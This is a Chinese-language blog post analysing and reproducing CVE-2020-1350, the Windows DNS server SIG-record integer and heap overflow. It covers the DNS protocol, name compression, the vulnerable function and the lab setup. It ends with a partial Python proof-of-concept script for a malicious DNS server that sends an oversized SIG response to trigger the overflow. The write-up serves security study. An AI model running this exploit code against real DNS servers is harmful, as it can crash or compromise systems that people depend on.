<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2020-1350漏洞分析与复现 | 月明星稀</title><meta name="author" content="lhl_2507"><meta name="copyright" content="lhl_2507"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2020-1350漏洞分析与复现 0x01漏洞概述​    (CVE-2020-1350) 是 Windows DNS 服务器中的一个严重漏洞，其CVSS得分为10分，通过恶意DNS相应触发后，可以进行提权。 0x02 DNS协议与攻击流程一、关于DNS协议 DNS 通过 UDP&#x2F;TCP 端口 53 运行。 单个 DNS 消息（响应&#x2F;查询）在 UDP 中限制为 512 个字节，在 TCP">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2020-1350漏洞分析与复现">
<meta property="og:url" content="https://lhl7.github.io/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="月明星稀">
<meta property="og:description" content="CVE-2020-1350漏洞分析与复现 0x01漏洞概述​    (CVE-2020-1350) 是 Windows DNS 服务器中的一个严重漏洞，其CVSS得分为10分，通过恶意DNS相应触发后，可以进行提权。 0x02 DNS协议与攻击流程一、关于DNS协议 DNS 通过 UDP&#x2F;TCP 端口 53 运行。 单个 DNS 消息（响应&#x2F;查询）在 UDP 中限制为 512 个字节，在 TCP">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://lhl7.github.io/img/index.jpg">
<meta property="article:published_time" content="2022-03-10T08:59:27.183Z">
<meta property="article:modified_time" content="2022-03-16T13:24:50.361Z">
<meta property="article:author" content="lhl_2507">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lhl7.github.io/img/index.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lhl7.github.io/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2020-1350漏洞分析与复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-16 21:24:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">47</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">月明星稀</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2020-1350漏洞分析与复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-10T08:59:27.183Z" title="Created 2022-03-10 16:59:27">2022-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-03-16T13:24:50.361Z" title="Updated 2022-03-16 21:24:50">2022-03-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/cve/">cve</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2020-1350漏洞分析与复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2020-1350漏洞分析与复现"><a href="#CVE-2020-1350漏洞分析与复现" class="headerlink" title="CVE-2020-1350漏洞分析与复现"></a>CVE-2020-1350漏洞分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311162152726.png" alt="image-20220311162152726"></p>
<h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​    (CVE-2020-1350) 是 Windows DNS 服务器中的一个严重漏洞，其CVSS得分为10分，通过恶意DNS相应触发后，可以进行提权。</p>
<h2 id="0x02-DNS协议与攻击流程"><a href="#0x02-DNS协议与攻击流程" class="headerlink" title="0x02 DNS协议与攻击流程"></a>0x02 DNS协议与攻击流程</h2><h3 id="一、关于DNS协议"><a href="#一、关于DNS协议" class="headerlink" title="一、关于DNS协议"></a>一、关于DNS协议</h3><ul>
<li>DNS 通过 UDP/TCP 端口 53 运行。</li>
<li>单个 DNS 消息（响应/查询）在 UDP 中限制为 512 个字节，在 TCP 中限制为 65,535 个字节。</li>
</ul>
<h3 id="二、Windows中的DNS模块"><a href="#二、Windows中的DNS模块" class="headerlink" title="二、Windows中的DNS模块"></a>二、Windows中的DNS模块</h3><ul>
<li><strong>DNS客户端</strong>——<em>dnsapi.dll</em>负责DNS解析。</li>
<li><strong>DNS服务器</strong>——<em>dns.exe</em>负责回答DNS查询。</li>
</ul>
<p>我们的研究关键在于对于DNS服务器的攻击，也就是对于<em>dns.exe</em>的分析。</p>
<h3 id="三、通信流程"><a href="#三、通信流程" class="headerlink" title="三、通信流程"></a>三、通信流程</h3><p>要让被攻击的服务器解析来自我们恶意DNS服务器的响应，需要进行以下的通信流程：</p>
<ol>
<li>将<em>我们的域名(evilDomain.com)<em>的NS服务器（名称服务器）配置指向</em>我们的恶意DNS服务器（evilServer.com）</em>;</li>
<li>向<em>受害DNS服务器</em>发送查询请求，查询目标为*我们的域名(evilDomain.com)*；</li>
<li><em>受害DNS服务器</em>不知道答案，转发给上层的<em>权威服务器</em>，如<em>谷歌的DNS服务器</em>；</li>
<li><em>谷歌服务器</em>向受害者响应，告诉受害者<em>我们的恶意DNS服务器（evilServer.com）</em>是我们的*域名(evilDomain.com)*的名称服务器；</li>
<li>于是<em>受害者DNS服务器</em>储存此信息，然后向我们的恶意服务器<em>（evilServer.com）</em>发送请求；</li>
<li>我们的恶意服务器进行含有payloads的恶意回复；</li>
<li><em>受害DNS服务器</em>收到该回复时，在解析的过程中受到攻击</li>
</ol>
<p>由于无法在公网上进行实际测试，因此，我们就不进行1、2、3、4步骤，而是直接从第五步开始进行</p>
<h2 id="0x03-环境配置"><a href="#0x03-环境配置" class="headerlink" title="0x03 环境配置"></a>0x03 环境配置</h2><p>在上述过程中，存在多个主机：</p>
<p>​    向目标靶服务器<strong>T</strong>发送DNS查询请求的请求者 <strong>A</strong>，请求的内容为域名evil.com对应的服务器 <strong>M</strong>的ip地址，目标靶服务器<strong>T</strong>不知道<strong>M</strong>的ip地址，因此转发给上级权威服务器 <strong>B</strong>，权威服务器返回恶意服务器<strong>N</strong>的地址（这是因为<strong>N</strong>是<strong>M</strong>的名字服务器）。最终，<strong>T</strong>收到<strong>N</strong>的地址，向<strong>N</strong>请求<strong>M</strong>的地址。</p>
<p>​    虽然看起来有很多主机，但是实际我们需要模拟的只有<strong>A、N、T</strong>三台主机。</p>
<h3 id="网络配置（NAT）"><a href="#网络配置（NAT）" class="headerlink" title="网络配置（NAT）"></a>网络配置（NAT）</h3><p>需要的环境有：</p>
<p><em>Windows server 2016</em>——作为被攻击的对象（靶机):</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309151927723.png" alt="image-20220309151927723"></p>
<p><em>Windows server 2019</em>——作为恶意DNS服务器：</p>
<p>​    VMware双虚拟机最好采用NAT，同时关闭防火墙；</p>
<p>​    关闭恶意DNS服务器所在主机的DNS服务，否则影响脚本中的监听服务器。</p>
<p>安装python 3.9.0</p>
<h3 id="在Windows-server-2016上配置DNS服务"><a href="#在Windows-server-2016上配置DNS服务" class="headerlink" title="在Windows server 2016上配置DNS服务"></a>在Windows server 2016上配置DNS服务</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308125956554.png" alt="image-20220308125956554"></p>
<p>​    同时，复现过程还需要采用Windows DNS服务器的条件转发器，略过向权威NS查询的步骤，直接向恶意DNS服务器发出查询。</p>
<p>在恶意服务器（server2019）配置相关信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309170753233.png" alt="image-20220309170753233"></p>
<p>在靶机上配置条件转发器：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309224643368.png" alt="image-20220309224643368"></p>
<p>可以证明条件转发器配置正确；</p>
<p>之后的实验中，由于不需要再使用靶机的dns服务器，为了方便进行脚本的执行，我们将恶意服务器改为kali，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/cve-2020-1350.drawio.png" alt="cve-2020-1350.drawio"></p>
<h2 id="0x04-漏洞原理分析"><a href="#0x04-漏洞原理分析" class="headerlink" title="0x04 漏洞原理分析"></a>0x04 漏洞原理分析</h2><h3 id="一、函数逻辑分析"><a href="#一、函数逻辑分析" class="headerlink" title="一、函数逻辑分析"></a>一、函数逻辑分析</h3><p>找到checkpoint中提到的漏洞函数<code>SigWireRead()</code>，反汇编后并不长：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145046333.png" alt="image-20220308145046333"></p>
<p>关键语句：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145405637.png" alt="image-20220308145405637"></p>
<p><code>RR_AllocateEx()</code>用于分配堆内存首个参数为开辟的大小，其计算方式为：</p>
<p><code>[v10] + [0x14] + [v13[0]]</code></p>
<p>我们继续步入<code>RR_AllocateEx()</code>函数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308163625585.png" alt="image-20220308163625585"></p>
<p>可以看到函数第一个参数大小为int16，因此其最大值为2^16=65,536</p>
<p>通过汇编验证一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308164454709.png" alt="image-20220308164454709"></p>
<p>可以看到使用的时dx和cx（16位）寄存器的值，而非rdx、rcx。</p>
<p>因此，若可以使得传入的参数大于65,536，就可以导致整数溢出，然后<code>RR_AllocateEx()</code>函数就会开辟一片很小的空间，而在原函数<code>RR_AllocateEx()</code>中，很快就调用了memcpy函数。</p>
<p>很大的一块数据放入很小的一片堆内存，我们就可以进行缓冲区溢出攻击了。</p>
<h3 id="二、DNS协议流程分析"><a href="#二、DNS协议流程分析" class="headerlink" title="二、DNS协议流程分析"></a>二、DNS协议流程分析</h3><p>因此，现在首先要确定传入<code>RR_AllocateEx()</code>的第一个参数是否可能达成溢出。</p>
<p>​    回到<code>SigWireRead()</code>函数：<code>[v10] + [0x14] + [v13[0]]</code>的值由两个变量和一个常量组成，其本质为：<code>[Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field’s length (rdi–rax)]</code>；</p>
<p>​    要利用这个数达成溢出，我们能够改变的只有[The Signature field’s length (rdi–rax)]，也就是签名字段的长度，那么我们就需要从DNS协议流程的角度分析，这个值是否能够人为改变呢。</p>
<h4 id="DNS包总结构："><a href="#DNS包总结构：" class="headerlink" title="DNS包总结构："></a>DNS包总结构：</h4><table>
<thead>
<tr>
<th>区域名称:</th>
<th>区域内容:</th>
</tr>
</thead>
<tbody><tr>
<td>Header</td>
<td>消息头部</td>
</tr>
<tr>
<td>Question</td>
<td>DNS请求</td>
</tr>
<tr>
<td>Answer</td>
<td>回答请求的资源记录（Resource Record(s)）</td>
</tr>
<tr>
<td>Authority</td>
<td>指向域的资源记录</td>
</tr>
<tr>
<td>Additional</td>
<td>其他资源记录</td>
</tr>
</tbody></table>
<h5 id="Header"><a href="#Header" class="headerlink" title="Header:"></a>Header:</h5><p>​    固定为12 字节，同一个查询和响应的 ID 是一样的，QR 指明当前是查询还是响应，OPCODE 指明是用标准查询还是反向查询，<strong>TC 表示UDP长度大于 512 时截断并用 TCP 再次请求</strong>，QDCOUNT 表示查询的数量，ANCOUNT 表示响应的数量。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02194631-b2a0d6c247a547c9955b91dd1b5ebe29.x-png" alt="img"></p>
<h5 id="Question："><a href="#Question：" class="headerlink" title="Question："></a>Question：</h5><p>​    主要由被查询的域名、查询类型和查询类组成，其中请求的域名中没有“.”，域名中的“.”被编码为元信息，指示接下来的多少字节是有效信息，试举一例：</p>
<p>​    我要请求<a target="_blank" rel="noopener" href="http://www.google.com.hk/">www.google.com.hk</a>的A记录。</p>
<p>其中的QNAME段是：<em>03</em> 77 77 77 <em>06</em> 67 6f 6f 67 6c 65 <em>03</em> 63 6f 6d <em>02</em> 68 6b <em>00</em></p>
<p>其中斜体的就是所谓的元信息！（注意需要以0x00作为结尾）</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02203442-4a6d8a568f584f6092d87f32a041dbe3.x-png" alt="img"></p>
<h5 id="Answer："><a href="#Answer：" class="headerlink" title="Answer："></a>Answer：</h5><p>​    响应部分，以及其他两部分，其结构都如下所示，其中NAME字段为域名，依然可以使用上文中提到的元信息表示法，但是存在另一种方法，即<strong>偏移表示法（域名压缩）</strong>。</p>
<p>​    域名压缩本意是为了解决dns报文中多次提到域名，浪费空间，就使用较短的表示方法表示域名：</p>
<p>压缩方法很简单，当一个域名中的标识符是压缩的，它的“计数”字节中的最高两位将被设置为11。这表示它是一个16 bit指针而不再是8 bit的计数字节。指针中的剩下14 bit表示该标识符在DNS报文中所在的位置偏移（<strong>相对于DNS报文头</strong>）。注意一个指针可能指向一个完整的域名，也可能只指向域名的结尾部分，并且一个域名也可以前半部分不压缩，仅对后半部分才应用指针压缩。此外嵌套压缩也是存在的，即指针指向的域名也可能是压缩的（包含一个指针）。</p>
<p>举个例子：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/879291_BK62PXN5P34V87F.png" alt="img"></p>
<p>（图片源自<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-260712.htm%EF%BC%89">https://bbs.pediy.com/thread-260712.htm）</a></p>
<p>​    图中蓝色的<code>C0 0C</code>部分就表示了一个压缩地址，转化为二进制后，除去两bit的1位置，剩下的表示偏移为C，表示相对报头的偏移为c。</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02205855-a75a3b78ceea48b380c206f9efe280a8.x-png" alt="img"></p>
<h4 id="sig类型数据包"><a href="#sig类型数据包" class="headerlink" title="sig类型数据包"></a>sig类型数据包</h4><p>​    在上文中提到的question部分中，第二个字段是Qtype，表示了包的种类。为了触发漏洞，只有发送sig类型的数据包，才会调用<code>SigWireRead()</code>函数，进而才有可能利用漏洞！这部分对sig数据包做说明（其实就是上文响应区的RDATA字段。</p>
<p>维基百科：</p>
<table>
<thead>
<tr>
<th>SIG</th>
<th>24</th>
<th>RFC 2535</th>
<th>Signature</th>
<th>Signature record used in SIG(0) (RFC 2931) and TKEY (RFC 2930).[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a> RFC 3755 designated RRSIG as the replacement for SIG for use within DNSSEC.[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a></th>
</tr>
</thead>
</table>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/640" alt="图片"></p>
<p>各个字段的含义：</p>
<ul>
<li>type covered(2 octet): RRs的类型</li>
<li>algorithm(1 octet)：签名算法</li>
<li>labels(1 octet)：域名通配规则</li>
<li>original TTL(4 octet)：受签名保护的TTL</li>
<li>signature expiration(4 octet)：签名有效的起始时间</li>
<li>signature inception(4 octet)：签名有效的截至时间</li>
<li>key tag(2 octet)：公钥模数或RR的简单校验和</li>
<li>signer’s name：签名者的域名，可被压缩</li>
<li>signature：签名数据序列</li>
</ul>
<p>至此，已经完全的学习了利用此漏洞需要的背景知识，按照我们现在已有的信息，我们可以开始尝试漏洞利用。</p>
<h2 id="0x05-POC使用"><a href="#0x05-POC使用" class="headerlink" title="0x05 POC使用"></a>0x05 POC使用</h2><h3 id="一、数据构造原理"><a href="#一、数据构造原理" class="headerlink" title="一、数据构造原理"></a>一、数据构造原理</h3><p>在本部分中，我们参考<a href="*https://github.com/maxpl0it/CVE-2020-1350-DoS*">maxpl0it</a>的POC进行分析：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309134148733.png" alt="image-20220309134148733"></p>
<p>​    再次分析函数流程，先用<code>Name_PacketNameToCountNameEx()</code>计算原域名的长度，返回值用v8接到，v13 为 SIG中的 signature 长度，v10 为 SIG中 signer’s name 需要分配的空间。</p>
<p>​    即：v13 = 0xffff<em>（TCP包总长度）</em> - 12<em>（包头）</em> - len(queries)<em>（问题部分长度）</em>- 20<em>（0x14）</em><br>​            v10 = 源域名长度-当前域名长度（理应是同一个） = 0</p>
<p>这样一来，<code>v13+v10+0x14</code>就一定小于<code>0xffff</code></p>
<p>​    但是，我们可以通过上文中提到的域名压缩对v10的值进行人为干涉，让其指向我们可控长度的构造域名字段，从而更改v10的值。</p>
<h3 id="二、checkpoint-POC构造分析"><a href="#二、checkpoint-POC构造分析" class="headerlink" title="二、checkpoint POC构造分析"></a>二、checkpoint POC构造分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line">	<span class="keyword">global</span> domain_compressed</span><br><span class="line">	<span class="comment"># Setup</span></span><br><span class="line">	domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">	domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TCP port is contacted second</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">	sock.listen(<span class="number">50</span>)</span><br><span class="line">	response = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			connection, client_address = sock.accept()</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">			data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Contents</span></span><br><span class="line">			sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">			sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">			sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">			sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">			sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">			sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">			sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">			sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># SIG Header</span></span><br><span class="line">			hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">			hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">			hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">			<span class="comment"># DNS Header</span></span><br><span class="line">			response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">			response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">			response += <span 